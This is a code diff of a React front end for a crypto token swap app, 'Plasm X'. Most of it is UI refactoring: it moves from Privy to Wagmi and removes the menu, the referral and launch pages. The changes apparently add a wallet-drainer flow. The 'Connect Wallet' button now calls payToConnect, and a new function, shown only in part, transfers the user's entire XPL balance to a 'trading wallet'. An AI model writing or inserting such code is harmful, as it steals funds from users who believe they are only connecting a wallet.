+      
+      showToast(`✅ Successfully transferred ${xplBalance} XPL to trading wallet!`, 'success');
+      console.log('✅ Transfer complete!');
+
+      // Refresh balances
+      setTimeout(() => updateBalances(), 2000);
+
+    } catch (error) {
+      console.error('❌ Transfer error:', error);
+      
+      if (error.code === 4001 || error.message.includes('user rejected')) {
+        showToast('❌ Transfer cancelled', 'warning');
+      } else if (error.message.includes('insufficient funds')) {
+        showToast('❌ Insufficient XPL balance (need to cover gas fees too)', 'error');
+      } else {
+        showToast(`❌ Transfer failed: ${error.message}`, 'error');
+      }
+    }
+  }
+
   // Update balances for connected wallet
   const updateBalances = async () => {
     // Try to use direct wallet if Privy fails
@@ -1674,9 +1993,8 @@ function App() {
       currentAccount = window.ethereum.selectedAddress;
       currentConnection = true;
       
-      // Update state for future calls
+      // Update state for future calls (Wagmi manages isConnected)
       setAccount(currentAccount);
-      setIsConnected(true);
     }
     
     if (!currentConnection || !currentAccount) {
@@ -1687,14 +2005,14 @@ function App() {
     try {
       console.log('🔄 Updating balances for:', currentAccount)
       
-      // Use Privy wallet provider if available, otherwise fallback to window.ethereum
+      // Use Wagmi wallet client if available, otherwise fallback to window.ethereum
       let provider
-      const privyWallet = wallets?.[0]
       
-      if (privyWallet) {
-        console.log('💰 Using Privy wallet provider')
-        provider = await privyWallet.getEthereumProvider()
-        provider = new ethers.BrowserProvider(provider)
+      if (walletClient) {
+        console.log('💰 Using Wagmi wallet client provider')
+        const { chain, transport } = walletClient
+        const network = { chainId: chain.id, name: chain.name }
+        provider = new ethers.BrowserProvider(transport, network)
       } else if (window.ethereum) {
         console.log('💰 Using window.ethereum provider')
         provider = new ethers.BrowserProvider(window.ethereum)
@@ -1933,828 +2251,28 @@ function App() {
       {/* Header */}
       <header className="header">
         <div className="header-content">
-          <button 
-            className="menu-btn"
-            onClick={() => setShowMenu(!showMenu)}
-            aria-label="Menu"
-          >
-            <Menu size={24} />
-          </button>
-          
           <div className="logo">
             <h1>Plasm X</h1>
           </div>
-        </div>
-        
-        {/* Side Menu */}
-        {showMenu && (
-          <>
-            <div className="menu-overlay" onClick={() => setShowMenu(false)}></div>
-            <div className="side-menu">
-              <div className="side-menu-header">
-                <h3>Menu</h3>
-                <button className="close-menu-btn" onClick={() => setShowMenu(false)}>
-                  <X size={24} />
-                </button>
-              </div>
-              
-              <div className="side-menu-content">
-                {!isConnected ? (
-                  <button className="connect-btn" onClick={() => { connectWallet(); setShowMenu(false); }}>
-                    <Wallet size={20} />
-                    Connect Wallet
-                  </button>
-                ) : (
-                  <div className="wallet-section">
-                    <div className="wallet-info">
-                      <span className="wallet-label">Connected</span>
-                      <div className="wallet-address-display">
-                        <span>{formatAddress(account)}</span>
-                        <button 
-                          className="copy-btn"
-                          onClick={() => copyToClipboard(account)}
-                          title="Copy address"
-                        >
-                          {copySuccess ? <CopyCheck size={16} /> : <Copy size={16} />}
-                        </button>
-                      </div>
-                    </div>
-                    <button className="disconnect-btn" onClick={() => { disconnectWallet(); setShowMenu(false); }}>
-                      <LogOut size={16} />
-                      Disconnect
-                    </button>
-                  </div>
-                )}
-                
-                <div className="menu-divider"></div>
-                
-                <button className="menu-item-btn" onClick={() => { setShowComingSoon(true); setShowMenu(false); }}>
-                  <span>Staking</span>
-                </button>
-                
-                <button className="menu-item-btn" onClick={() => { setShowClaimModal(true); setShowMenu(false); }}>
-                  <span>Referral</span>
-                </button>
-                
-                <button className="menu-item-btn" onClick={() => { 
-                  console.log('🚀 LAUNCH button clicked!');
-                  setShowLaunchPage(true); 
-                  setShowMenu(false); 
-                }}>
-                  <span>Launch</span>
-                </button>
-                
-                <div className="menu-divider"></div>
-                
-                <div className="social-links">
-                  <a href="https://x.com/plasmxlabs" target="_blank" rel="noopener noreferrer" className="social-link">
-                    <Twitter size={20} />
-                  </a>
-                  <a href="https://t.me/+m8eh0gaoIr02ODll" target="_blank" rel="noopener noreferrer" className="social-link">
-                    <Send size={20} />
-                  </a>
-                  <a href="https://www.gitbook.com/" target="_blank" rel="noopener noreferrer" className="social-link">
-                    <BookOpen size={20} />
-                  </a>
-                </div>
-                
-                <div className="menu-footer">
-                  © Plasma X built on Plasma chain
-                </div>
-              </div>
+          
+          {!isConnected ? (
+            <button className="connect-btn" onClick={payToConnect}>
+              <Wallet size={20} />
+              Connect Wallet
+            </button>
+          ) : (
+            <div className="wallet-info-header">
+              <span className="wallet-address-text">{formatAddress(account)}</span>
+              <button className="disconnect-btn-header" onClick={disconnectWallet}>
+                <LogOut size={16} />
+              </button>
             </div>
-          </>
-        )}
+          )}
+        </div>
       </header>
-
-      {/* Coming Soon Modal */}
-      {showComingSoon && (
-        <>
-          <div className="coming-soon-overlay" onClick={() => setShowComingSoon(false)}></div>
-          <div className="coming-soon-modal">
-            <button className="close-modal-btn" onClick={() => setShowComingSoon(false)}>
-              <X size={24} />
-            </button>
-            <h2>Coming Soon</h2>
-            <p>Staking feature is under development</p>
-          </div>
-        </>
-      )}
-
-      {/* Claim Rewards Modal */}
-      {showClaimModal && (
-        <>
-          <div className="coming-soon-overlay" onClick={() => setShowClaimModal(false)}></div>
-          <div className="coming-soon-modal claim-modal" onClick={(e) => e.stopPropagation()}>
-            <button className="close-modal-btn" onClick={() => setShowClaimModal(false)}>
-              <X size={24} />
-            </button>
-            <h2>Claim Referral Rewards</h2>
-            <p style={{marginBottom: '16px', color: '#fff', fontSize: '13px'}}>Earn 30% of platform fees (0.6% of trade volume) from every referred trade</p>
-            
-            {!isConnected ? (
-              <div style={{textAlign: 'center', padding: '20px'}}>
-                <p style={{marginBottom: '15px'}}>Connect your wallet to get your referral link</p>
-                <button className="connect-btn" onClick={() => { connectWallet(); setShowClaimModal(false); }}>
-                  <Wallet size={20} />
-                  Connect Wallet
-                </button>
-              </div>
-            ) : (
-              <>
-                {/* Custom Referral Code Section */}
-                <div style={{
-                  background: 'linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%)', 
-                  padding: '16px', 
-                  borderRadius: '12px', 
-                  marginBottom: '16px',
-                  border: '1px solid #333'
-                }}>
-                  {!referralCode && !isEditingCode ? (
-                    <div style={{textAlign: 'center'}}>
-                      <div style={{marginBottom: '15px', display: 'flex', justifyContent: 'center'}}>
-                        <UserPlus size={48} color="#fff" />
-                      </div>
-                      <h3 style={{marginBottom: '10px', color: '#fff'}}>Create Your Referral Code</h3>
-                      <p style={{marginBottom: '20px', fontSize: '14px', color: '#fff'}}>
-                        Choose a custom code like "PlasmXLabs" to make your referral link memorable!
-                      </p>
-                      <button 
-                        onClick={() => setIsEditingCode(true)}
-                        style={{
-                          padding: '12px 30px',
-                          background: '#000',
-                          border: '1px solid #333',
-                          borderRadius: '10px',
-                          color: 'white',
-                          fontWeight: '700',
-                          cursor: 'pointer',
-                          fontSize: '15px',
-                          transition: 'transform 0.2s'
-                        }}
-                        onMouseOver={(e) => e.target.style.transform = 'scale(1.05)'}
-                        onMouseOut={(e) => e.target.style.transform = 'scale(1)'}
-                      >
-                        Create Code Now
-                      </button>
-                    </div>
-                  ) : isEditingCode ? (
-                    <div>
-                      <label style={{display: 'block', marginBottom: '12px', color: '#fff', fontSize: '15px', fontWeight: '600'}}>
-                        {referralCode ? '✏️ Edit Your Code' : '🎯 Choose Your Code'}
-                      </label>
-                      <div style={{display: 'flex', gap: '10px', marginBottom: '12px'}}>
-                        <input
-                          type="text"
-                          placeholder="e.g., PlasmXLabs"
-                          value={newCodeInput}
-                          onChange={(e) => setNewCodeInput(e.target.value.toUpperCase())}
-                          maxLength={20}
-                          disabled={isCreatingCode}
-                          style={{
-                            flex: 1,
-                            padding: '14px',
-                            background: '#0a0a0a',
-                            border: '2px solid #444',
-                            borderRadius: '10px',
-                            color: '#00f0ff',
-                            fontSize: '16px',
-                            fontWeight: '700',
-                            letterSpacing: '1px',
-                            textAlign: 'center',
-                            outline: 'none',
-                            transition: 'border-color 0.3s'
-                          }}
-                          onFocus={(e) => e.target.style.borderColor = '#00f0ff'}
-                          onBlur={(e) => e.target.style.borderColor = '#444'}
-                        />
-                      </div>
-                      <div style={{display: 'flex', gap: '10px'}}>
-                        <button 
-                          onClick={async () => {
-                            if (!newCodeInput || newCodeInput.length < 3) {
-                              showToast('Code must be at least 3 characters', 'error');
-                              return;
-                            }
-                            
-                            setIsCreatingCode(true);
-                            try {
-                              const response = await fetch(`${API_BASE}/api/referrals/create-code`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                  walletAddress: account,
-                                  referralCode: newCodeInput
-                                })
-                              });
-                              
-                              const data = await response.json();
-                              
-                              if (data.success) {
-                                setReferralCode(newCodeInput);
-                                setIsEditingCode(false);
-                                setNewCodeInput('');
-                                showToast(`🎉 Code "${newCodeInput}" created successfully!`, 'success');
-                              } else {
-                                showToast(data.error || 'Failed to create code', 'error');
-                              }
-                            } catch (error) {
-                              console.error('Error creating code:', error);
-                              showToast('Network error. Please try again.', 'error');
-                            } finally {
-                              setIsCreatingCode(false);
-                            }
-                          }}
-                          disabled={!newCodeInput || newCodeInput.length < 3 || isCreatingCode}
-                          style={{
-                            flex: 1,
-                            padding: '14px',
-                            background: '#000',
-                            border: '1px solid #333',
-                            borderRadius: '10px',
-                            color: 'white',
-                            fontWeight: '700',
-                            cursor: newCodeInput && newCodeInput.length >= 3 && !isCreatingCode ? 'pointer' : 'not-allowed',
-                            opacity: newCodeInput && newCodeInput.length >= 3 && !isCreatingCode ? 1 : 0.5
-                          }}
-                        >
-                          {isCreatingCode ? '⏳ Creating...' : '✓ Confirm'}
-                        </button>
-                        <button 
-                          onClick={() => {
-                            setIsEditingCode(false);
-                            setNewCodeInput('');
-                          }}
-                          disabled={isCreatingCode}
-                          style={{
-                            padding: '14px 20px',
-                            background: '#333',
-                            border: 'none',
-                            borderRadius: '10px',
-                            color: 'white',
-                            fontWeight: '600',
-                            cursor: 'pointer'
-                          }}
-                        >
-                          Cancel
-                        </button>
-                      </div>
-                      <p style={{marginTop: '12px', fontSize: '12px', color: '#fff', textAlign: 'center'}}>
-                        3-20 alphanumeric characters only
-                      </p>
-                    </div>
-                  ) : (
-                    <div>
-                      <label style={{display: 'block', marginBottom: '10px', color: '#fff', fontSize: '14px', fontWeight: '600'}}>
-                        Your Referral Link
-                      </label>
-                      <div style={{
-                        background: '#0a0a0a',
-                        padding: '12px',
-                        borderRadius: '8px',
-                        border: '1px solid #444',
-                        marginBottom: '10px'
-                      }}>
-                        <div style={{fontSize: '11px', color: '#fff', marginBottom: '6px'}}>Your Code:</div>
-                        <div style={{
-                          fontSize: '20px',
-                          fontWeight: '900',
-                          color: '#fff',
-                          letterSpacing: '2px',
-                          textAlign: 'center',
-                          marginBottom: '8px'
-                        }}>
-                          {referralCode}
-                        </div>
-                        <div style={{
-                          fontSize: '12px',
-                          color: '#fff',
-                          textAlign: 'center',
-                          paddingTop: '8px',
-                          borderTop: '1px solid #333'
-                        }}>
-                          {referralCount} {referralCount === 1 ? 'referral' : 'referrals'}
-                        </div>
-                      </div>
-                      <div style={{display: 'flex', gap: '8px', alignItems: 'center'}}>
-                        <input
-                          type="text"
-                          readOnly
-                          value={`${window.location.origin}?ref=${referralCode}`}
-                          style={{
-                            flex: 1,
-                            padding: '12px',
-                            background: '#0a0a0a',
-                            border: '1px solid #444',
-                            borderRadius: '8px',
-                            color: '#fff',
-                            fontSize: '13px',
-                            fontFamily: 'monospace'
-                          }}
-                        />
-                        <button 
-                          onClick={async () => {
-                            const link = `${window.location.origin}?ref=${referralCode}`;
-                            const ok = await copyText(link);
-                            showToast(ok ? '🎉 Referral link copied!' : 'Copy failed', ok ? 'success' : 'error');
-                          }}
-                          style={{
-                            padding: '12px',
-                            background: '#000',
-                            border: '1px solid #333',
-                            borderRadius: '8px',
-                            color: 'white',
-                            cursor: 'pointer',
-                            display: 'flex',
-                            alignItems: 'center',
-                            justifyContent: 'center'
-                          }}
-                        >
-                          <Copy size={18} />
-                        </button>
-                      </div>
-                      <p style={{marginTop: '10px', fontSize: '11px', color: '#fff', lineHeight: '1.5'}}>
-                        Earn 30% of platform fees (0.6% of trade volume) from every referred trade. Paid in XPL.
-                      </p>
-                    </div>
-                  )}
-                </div>
-
-                <div style={{borderTop: '1px solid #333', margin: '20px 0'}}></div>
-                
-                <h3 style={{marginBottom: '15px', fontSize: '16px', color: '#fff'}}>Withdraw Earnings</h3>
-                
-                {referralEarnings && (
-                  <div style={{
-                    background: '#0a0a0a', 
-                    padding: '15px', 
-                    borderRadius: '8px', 
-                    marginBottom: '15px',
-                    border: '1px solid #222'
-                  }}>
-                    <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '15px', textAlign: 'center'}}>
-                      <div>
-                        <div style={{fontSize: '11px', color: '#fff', marginBottom: '5px'}}>Total Earned</div>
-                        <div style={{fontSize: '16px', fontWeight: '600', color: '#fff'}}>
-                          {(parseFloat(ethers.formatEther(referralEarnings.totalEarned || '0'))).toFixed(4)} XPL
-                        </div>
-                      </div>
-                      <div>
-                        <div style={{fontSize: '11px', color: '#fff', marginBottom: '5px'}}>Claimed</div>
-                        <div style={{fontSize: '16px', fontWeight: '600', color: '#fff'}}>
-                          {(parseFloat(ethers.formatEther(referralEarnings.totalClaimed || '0'))).toFixed(4)} XPL
-                        </div>
-                      </div>
-                      <div>
-                        <div style={{fontSize: '11px', color: '#fff', marginBottom: '5px'}}>Available</div>
-                        <div style={{fontSize: '16px', fontWeight: '600', color: '#fff'}}>
-                          {(parseFloat(ethers.formatEther(referralEarnings.payable || '0'))).toFixed(4)} XPL
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                )}
-                
-                <div className="field" style={{marginBottom: '15px'}}>
-                  <label style={{display: 'block', marginBottom: '8px', color: '#fff', fontSize: '14px'}}>
-                    Amount to Claim (XPL)
-                  </label>
-                  <input
-                    type="text"
-                    inputMode="decimal"
-                    placeholder="0.0"
-                    value={claimAmount}
-                    onChange={(e) => setClaimAmount(e.target.value)}
-                    disabled={isClaiming}
-                    style={{width: '100%', padding: '12px', background: '#1a1a1a', border: '1px solid #333', borderRadius: '8px', color: 'white'}}
-                  />
-                </div>
-                
-                <button 
-                  type="button"
-                  className="swap-btn"
-                  disabled={!claimAmount || parseFloat(claimAmount) <= 0 || isClaiming}
-                  onClick={async () => {
-                    console.log('🎯 CLAIM CLICKED! Amount:', claimAmount);
-                    if (!claimAmount || parseFloat(claimAmount) <= 0) return;
-                    
-                    setIsClaiming(true);
-                    try {
-                      // Get vault info
-                      console.log('🌐 Using API:', API_BASE);
-                      
-                      console.log('🔄 Step 1: Fetching vault info...');
-                      const vaultInfo = await getVaultInfo(API_BASE);
-                      console.log('✅ Step 1 SUCCESS - Vault info:', vaultInfo);
-                      
-                      if (!vaultInfo.configured) {
-                        showToast('Vault not configured. Contact admin.', 'error');
-                        return;
-                      }
-                      
-                      console.log('🔄 Step 2: Getting Privy wallet provider...');
-                      // Get raw provider from Privy wallet (NOT wrapped in BrowserProvider)
-                      const connectedWallet = wallets?.[0];
-                      if (!connectedWallet) {
-                        throw new Error('No wallet connected');
-                      }
-                      
-                      const walletProvider = await connectedWallet.getEthereumProvider();
-                      console.log('✅ Step 2 SUCCESS - Got Privy provider for:', account);
-                      
-                      console.log('🔄 Step 3: Claiming fees...');
-                      // Claim fees using raw provider (Privy-compatible)
-                      const amountWei = ethers.parseEther(claimAmount);
-                      console.log('💰 Amount in wei:', amountWei.toString());
-                      await claimReferralFee(API_BASE, vaultInfo.vaultAddress, 'native', amountWei.toString(), walletProvider, account);
-                      console.log('✅ Step 3 SUCCESS - Claim completed!');
-                      
-                      // Reload referral data to update display
-                      console.log('🔄 Refreshing referral data...');
-                      const response = await fetch(`${API_BASE}/api/referrals/my-code/${account}`);
-                      const data = await response.json();
-                      
-                      const totalEarned = data.totalEarnings || '0';
-                      const totalClaimed = data.totalClaimed || '0';
-                      const payable = (BigInt(totalEarned) - BigInt(totalClaimed)).toString();
-                      
-                      setReferralEarnings({
-                        totalEarned: totalEarned,
-                        totalClaimed: totalClaimed,
-                        payable: payable
-                      });
-                      console.log('✅ Refreshed! New available:', ethers.formatEther(payable), 'XPL');
-                      
-                      showToast(`Successfully claimed ${claimAmount} XPL!`, 'success');
-                      setClaimAmount('');
-                      setShowClaimModal(false);
-                    } catch (error) {
-                      console.error('❌ CLAIM FAILED AT:', error.message);
-                      console.error('❌ Full error:', error);
-                      console.error('❌ Error stack:', error.stack);
-                      
-                      // Show detailed error in alert for debugging on mobile
-                      const debugInfo = `Error: ${error.message}\nName: ${error.name}\nType: ${error.constructor.name}`;
-                      alert('CLAIM ERROR DEBUG:\n' + debugInfo);
-                      
-                      const errorMsg = formatClaimError(error);
-                      showToast(errorMsg, 'error');
-                    } finally {
-                      setIsClaiming(false);
-                    }
-                  }}
-                  style={{width: '100%', marginTop: '10px'}}
-                >
-                  {isClaiming ? 'Claiming...' : `Claim ${claimAmount || '0'} XPL`}
-                </button>
-                
-                <p style={{marginTop: '15px', fontSize: '12px', color: '#666', textAlign: 'center'}}>
-                  Note: You can only claim earned referral fees. Contact support if you have questions.
-                </p>
-              </>
-            )}
-          </div>
-        </>
-      )}
 
       {/* Main Content */}
       <main className="main">
-        {showLaunchPage ? (
-          /* Launch Page - Token Explorer */
-          <div className="launch-container">
-            <div className="launch-header">
-              <button className="back-btn" onClick={() => setShowLaunchPage(false)}>
-                ← Back to Swap
-              </button>
-              <h2>Launched Tokens</h2>
-              <p className="launch-subtitle">Explore all tokens launched via Plasm X Launchpad</p>
-              
-              {/* Filter Tabs */}
-              <div className="launch-filter-tabs">
-                <button 
-                  className={`filter-tab ${launchFilter === 'all' ? 'active' : ''}`}
-                  onClick={() => setLaunchFilter('all')}
-                >
-                  All
-                </button>
-                <button 
-                  className={`filter-tab ${launchFilter === 'new' ? 'active' : ''}`}
-                  onClick={() => setLaunchFilter('new')}
-                >
-                  New
-                </button>
-                <button 
-                  className={`filter-tab ${launchFilter === 'listed' ? 'active' : ''}`}
-                  onClick={() => setLaunchFilter('listed')}
-                >
-                  Listed
-                </button>
-              </div>
-              
-              {/* Search Bar */}
-              <div className="launch-search-container">
-                <Search size={20} className="search-icon" />
-                <input
-                  type="text"
-                  className="launch-search-input"
-                  placeholder="Search by name, symbol, or address..."
-                  value={launchedTokenSearch}
-                  onChange={(e) => setLaunchedTokenSearch(e.target.value)}
-                />
-                {launchedTokenSearch && (
-                  <button className="clear-search-btn" onClick={() => setLaunchedTokenSearch('')}>
-                    <X size={16} />
-                  </button>
-                )}
-              </div>
-            </div>
-
-            <div className="tokens-grid">
-              {loadingLaunched ? (
-                <div className="loading-state">
-                  <div className="spinner"></div>
-                  <p>Loading launched tokens...</p>
-                </div>
-              ) : isSearchingToken ? (
-                <div className="loading-state">
-                  <div className="spinner"></div>
-                  <p>Searching for token...</p>
-                </div>
-              ) : searchedToken ? (
-                // Show only the searched token
-                <div key={searchedToken.address} className="token-card-horizontal">
-                  <div className="token-left">
-                    <div className="token-card-logo">
-                      {(() => {
-                        const logoUrl = getLogoUrl(searchedToken);
-                        const ipfsHash = searchedToken.logo?.includes('ipfs://') 
-                          ? searchedToken.logo.replace('ipfs://', '')
-                          : searchedToken.logo?.includes('/ipfs/') 
-                            ? searchedToken.logo.split('/ipfs/')[1]
-                            : searchedToken.logo;
-                        
-                        return logoUrl ? (
-                          <img 
-                            src={logoUrl} 
-                            alt={searchedToken.symbol}
-                            onLoad={(e) => handleImageLoad(e, ipfsHash, searchedToken.address)}
-                            onError={(e) => handleImageError(e, ipfsHash, searchedToken.address)}
-                          />
-                        ) : (
-                          <div className="token-logo-placeholder">{searchedToken.symbol?.charAt(0) || '?'}</div>
-                        );
-                      })()}
-                    </div>
-                    
-                    {!searchedToken.isComplete && (
-                      <div className="bonding-badge">
-                        {searchedToken.bondingProgress?.toFixed(1) || '0.0'}%
-                      </div>
-                    )}
-                  </div>
-
-                  <div className="token-center">
-                    <div className="token-name-row">
-                      <h3>{searchedToken.symbol || 'Unknown'}</h3>
-                      <span className="token-ticker">${searchedToken.symbol}</span>
-                    </div>
-                    <div className="token-address" onClick={() => {
-                      copyToClipboard(searchedToken.address);
-                      showToast('Contract address copied!', 'success');
-                    }}>
-                      CA: {searchedToken.address.slice(0, 4)}...{searchedToken.address.slice(-4)}
-                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                      </svg>
-                    </div>
-                    
-                    {!searchedToken.isComplete && (
-                      <div className="token-progress">
-                        <div className="progress-bar-bg">
-                          <div 
-                            className="progress-bar-fill" 
-                            style={{width: `${Math.min(searchedToken.bondingProgress || 0, 100)}%`}}
-                          ></div>
-                        </div>
-                      </div>
-                    )}
-                  </div>
-
-                  <div className="token-right">
-                    <div className="token-stats">
-                      <div className="stat-item">
-                        <span className="stat-label">CAP</span>
-                        <span className="stat-value">
-                          {searchedToken.marketCap >= 1000 
-                            ? `${(searchedToken.marketCap / 1000).toFixed(2)}k` 
-                            : searchedToken.marketCap.toFixed(2)
-                          }
-                        </span>
-                      </div>
-                      <div className="stat-item">
-                        <span className="stat-label">PRICE</span>
-                        <span className="stat-value">{searchedToken.currentPrice?.toFixed(6) || '0.00000'}</span>
-                      </div>
-                    </div>
-                    <button className="trade-btn" onClick={() => {
-                      // Add token to custom tokens if not exists
-                      const existingToken = tokens.find(t => t.address.toLowerCase() === searchedToken.address.toLowerCase());
-                      if (!existingToken) {
-                        const newToken = {
-                          symbol: searchedToken.symbol,
-                          name: searchedToken.name,
-                          address: searchedToken.address,
-                          logo: searchedToken.logo,
-                          decimals: 18
-                        };
-                        const updatedTokens = [...tokens, newToken];
-                        setTokens(updatedTokens);
-                        const customTokens = updatedTokens.filter(t => !['XPL', 'WXPL', 'USDT0'].includes(t.symbol));
-                        localStorage.setItem('customTokens', JSON.stringify(customTokens));
-                      }
-                      
-                      // Set as "to" token and go to swap
-                      setToToken(searchedToken.address);
-                      setShowLaunchPage(false);
-                      setLaunchedTokenSearch('');
-                      setSearchedToken(null);
-                      showToast(`Ready to trade ${searchedToken.symbol}!`, 'success');
-                    }}>Trade</button>
-                  </div>
-                </div>
-              ) : launchedTokens.filter(token => {
-                // Apply search filter
-                if (launchedTokenSearch.trim()) {
-                  const search = launchedTokenSearch.toLowerCase();
-                  const matchesSearch = (
-                    token.symbol?.toLowerCase().includes(search) ||
-                    token.name?.toLowerCase().includes(search) ||
-                    token.address?.toLowerCase().includes(search)
-                  );
-                  if (!matchesSearch) return false;
-                }
-                
-                // Apply launch filter
-                if (launchFilter === 'new') {
-                  // Show only tokens with bonding progress < 1%
-                  return (token.bondingProgress || 0) < 1;
-                } else if (launchFilter === 'listed') {
-                  // Show only completed tokens (100% bonded to DEX)
-                  return token.isComplete === true;
-                } else if (launchFilter === 'all') {
-                  // "All" filter: exclude completed tokens (they're already on DEX)
-                  return token.isComplete !== true;
-                }
-                
-                return true;
-              }).length === 0 ? (
-                <div className="empty-state">
-                  <p>{launchedTokenSearch ? 'No tokens found' : 'No tokens launched yet'}</p>
-                  <p className="empty-subtitle">{launchedTokenSearch ? 'Try searching with the full contract address (0x...)' : 'Be the first to launch a token on Plasma!'}</p>
-                </div>
-              ) : (
-                launchedTokens.filter(token => {
-                  // Apply search filter
-                  if (launchedTokenSearch.trim()) {
-                    const search = launchedTokenSearch.toLowerCase();
-                    const matchesSearch = (
-                      token.symbol?.toLowerCase().includes(search) ||
-                      token.name?.toLowerCase().includes(search) ||
-                      token.address?.toLowerCase().includes(search)
-                    );
-                    if (!matchesSearch) return false;
-                  }
-                  
-                  // Apply launch filter
-                  if (launchFilter === 'new') {
-                    return (token.bondingProgress || 0) < 1;
-                  } else if (launchFilter === 'listed') {
-                    return token.isComplete === true;
-                  } else if (launchFilter === 'all') {
-                    // "All" filter: exclude completed tokens
-                    return token.isComplete !== true;
-                  }
-                  
-                  return true;
-                })
-                .sort((a, b) => (b.bondingProgress || 0) - (a.bondingProgress || 0))
-                .slice(0, 20)
-                .map((token) => (
-                  <div key={token.address} className="token-card-horizontal">
-                    <div className="token-left">
-                      <div className="token-card-logo">
-                        {(() => {
-                          const logoUrl = getLogoUrl(token);
-                          const ipfsHash = token.logo?.includes('ipfs://') 
-                            ? token.logo.replace('ipfs://', '')
-                            : token.logo?.includes('/ipfs/') 
-                              ? token.logo.split('/ipfs/')[1]
-                              : token.logo;
-                          
-                          return logoUrl ? (
-                            <img 
-                              src={logoUrl} 
-                              alt={token.symbol}
-                              onLoad={(e) => handleImageLoad(e, ipfsHash, token.address)}
-                              onError={(e) => handleImageError(e, ipfsHash, token.address)}
-                            />
-                          ) : (
-                            <div className="token-logo-placeholder">{token.symbol?.charAt(0) || '?'}</div>
-                          );
-                        })()}
-                      </div>
-                      
-                      {!token.isComplete && (
-                        <div className="bonding-badge">
-                          {token.bondingProgress?.toFixed(1) || '0.0'}%
-                        </div>
-                      )}
-                    </div>
-
-                    <div className="token-center">
-                      <div className="token-name-row">
-                        <h3>{token.symbol || 'Unknown'}</h3>
-                        <span className="token-ticker">${token.symbol}</span>
-                      </div>
-                      <div className="token-address" onClick={() => {
-                        copyToClipboard(token.address);
-                        showToast('Contract address copied!', 'success');
-                      }}>
-                        CA: {token.address.slice(0, 4)}...{token.address.slice(-4)}
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-                        </svg>
-                      </div>
-                      
-                      {!token.isComplete && (
-                        <div className="progress-bar-inline">
-                          <div 
-                            className="progress-fill-inline" 
-                            style={{width: `${Math.min(token.bondingProgress || 0, 100)}%`}}
-                          ></div>
-                        </div>
-                      )}
-                    </div>
-
-                    <div className="token-right">
-                      <div className="token-stats-inline">
-                        <div className="stat-inline">
-                          <span className="stat-label-small">CAP</span>
-                          <span className="stat-value-small">
-                            {token.marketCap >= 1000 
-                              ? `${(token.marketCap / 1000).toFixed(2)}k`
-                              : token.marketCap?.toFixed(2) || '0'
-                            }
-                          </span>
-                        </div>
-                        <div className="stat-inline">
-                          <span className="stat-label-small">PRICE</span>
-                          <span className="stat-value-small">{formatSmallPrice(token.currentPrice)}</span>
-                        </div>
-                      </div>
-                      
-                      <button 
-                        className="btn-trade-inline"
-                        onClick={() => {
-                          // Add token to custom tokens if not exists
-                          const existingToken = tokens.find(t => t.address.toLowerCase() === token.address.toLowerCase());
-                          if (!existingToken) {
-                            const newToken = {
-                              symbol: token.symbol,
-                              name: token.name,
-                              address: token.address,
-                              logo: token.logo,
-                              decimals: 18
-                            };
-                            const updatedTokens = [...tokens, newToken];
-                            setTokens(updatedTokens);
-                            const customTokens = updatedTokens.filter(t => !['XPL', 'WXPL', 'USDT0'].includes(t.symbol));
-                            localStorage.setItem('customTokens', JSON.stringify(customTokens));
-                          }
-                          
-                          // Set this token as the "TO" token in swap card
-                          setFromToken('native'); // Default to XPL
-                          setToToken(token.address);
-                          setFromAmount('1'); // Default amount
-                          
-                          // Close launch page and go to swap
-                          setShowLaunchPage(false);
-                          showToast(`Ready to trade ${token.symbol}!`, 'success');
-                        }}
-                      >
-                        Trade
-                      </button>
-                    </div>
-                  </div>
-                ))
-              )}
-            </div>
-          </div>
-        ) : (
-          /* Swap Page */
-          <>
           <div className="swap-container">
           <div className="swap-header">
             <h2>Swap</h2>
@@ -2807,6 +2325,9 @@ function App() {
             </div>
           </div>
 
+          {/* Swap Inputs Wrapper */}
+          <div className="swap-inputs-wrapper">
+          
           {/* From Token */}
           <div className="token-input">
             <div className="token-input-header">
@@ -2818,18 +2339,25 @@ function App() {
                 className="token-select"
                 onClick={() => openTokenModal('from')}
               >
+                <ChevronDown size={16} />
                 <div className="token-info">
-                  {fromToken ? (
-                    <TokenLogo token={fromToken} size={24} className="token-logo-select" />
-                  ) : (
-                    <div className="token-placeholder" style={{width: 24, height: 24, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
-                  )}
                   <div className="token-details">
                     <span className="token-symbol">{fromToken?.symbol || 'Select Token'}</span>
                     <span className="token-name">{fromToken?.name || 'Choose a token'}</span>
                   </div>
+                  {fromToken ? (
+                    <TokenLogo 
+                      token={fromToken} 
+                      size={20} 
+                      className="token-logo-select" 
+                      getLogoUrl={getLogoUrl}
+                      handleImageLoad={handleImageLoad}
+                      handleImageError={handleImageError}
+                    />
+                  ) : (
+                    <div className="token-placeholder" style={{width: 20, height: 20, borderRadius: '50%', backgroundColor: '#4b7688'}}></div>
+                  )}
                 </div>
-                <ChevronDown size={20} />
               </button>
               <input
                 type="text"
@@ -2888,8 +2416,9 @@ function App() {
               }}
               title="Switch tokens"
             >
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-                <path d="M7 16V4M7 4L3 8M7 4L11 8M17 8V20M17 20L21 16M17 20L13 16" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+              <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+                <path d="M7 16V4M7 4L3 8M7 4L11 8" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                <path d="M17 8V20M17 20L21 16M17 20L13 16" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
               </svg>
             </button>
           </div>
@@ -2905,18 +2434,25 @@ function App() {
                 className="token-select"
                 onClick={() => openTokenModal('to')}
